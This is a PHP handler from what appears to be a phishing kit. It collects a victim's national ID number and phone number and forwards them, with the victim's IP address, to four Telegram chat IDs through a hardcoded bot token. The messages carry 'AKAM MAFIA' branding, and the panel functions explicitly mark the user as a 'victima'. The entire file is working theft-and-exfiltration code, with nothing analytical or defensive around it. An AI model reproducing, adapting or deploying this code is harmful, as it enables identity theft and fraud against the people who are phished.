<?php
require_once('../panel/lib/funciones.php');
date_default_timezone_set('America/Bogota');

$ip = $_SERVER['REMOTE_ADDR'];
$documento = isset($_POST['doc']) ? $_POST['doc'] : '';
$celular = isset($_POST['cel']) ? $_POST['cel'] : '';

if (!empty($documento)) {
    // 1. Guardar en Panel y CAMBIAR ESTADO A 2 (Dinámica)
    // Lo hacemos primero para que la logística no se trabe
    if (function_exists('traer_regitro')) {
        $registro = traer_regitro($ip);
        if (function_exists('actualizar_registro_info')) {
            actualizar_registro_info($registro, $documento, $celular);
        }
    }

    if (function_exists('actualizar_estado_victima')) {
        actualizar_estado_victima($ip, "2"); 
    }

    // 2. Configuración del Bot 𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 (4 IDs agregados)
    $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
    $chat_ids = [
        "8114050673", 
        "8518977918", 
        "8638340940", 
        "8645545892"
    ];
    
    $mensaje = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - INFO</b> ⭐\n\n";
    $mensaje .= "👤 <b>IP:</b> <code>$ip</code>\n";
    $mensaje .= "🪪 <b>DOC:</b> <code>$documento</code>\n";
    $mensaje .= "📱 <b>CEL:</b> <code>$celular</code>\n";
    $mensaje .= "⏰ <b>HORA:</b> " . date('H:i:s') . "\n";
    $mensaje .= "━━━━━━━━━━━━━━━";

    // 3. Envío masivo a los 4 IDs
    foreach ($chat_ids as $id) {
        $url = "https://api.telegram.org/bot$token/sendMessage";
        $data = [
            'chat_id' => $id, 
            'text' => $mensaje, 
            'parse_mode' => 'HTML'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_exec($ch);
        curl_close($ch);
    }
}

// Retornamos "ok" para que el JavaScript en WAITING.php sepa que puede avanzar
echo "ok";
?>
